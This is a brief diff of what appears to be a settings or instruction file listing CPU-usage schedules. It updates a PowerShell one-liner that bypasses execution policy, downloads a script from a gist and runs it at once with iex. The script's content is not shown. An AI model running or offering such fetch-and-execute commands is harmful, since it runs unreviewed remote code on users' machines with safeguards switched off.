@@ -10,7 +10,7 @@ DEFAULT
 
 75% CPU Usage / 24 Hours | 6:30-6:30 Day Session at 50% | 7:00-7:00 Night Session at 100%
 
-@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/i7-7700/01dc9aa6bb601755ae85b0214cc87458/raw/2a96a3c5f592b91e69d9b7c77928e68afc05d72d/Default.ps1'))"
+@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/i7-7700/01dc9aa6bb601755ae85b0214cc87458/raw/785a01d325725cea9d7f5c75552b15b9ace8ebfe/Default.ps1'))"
 
 --------------------------------------------------------------------------
 
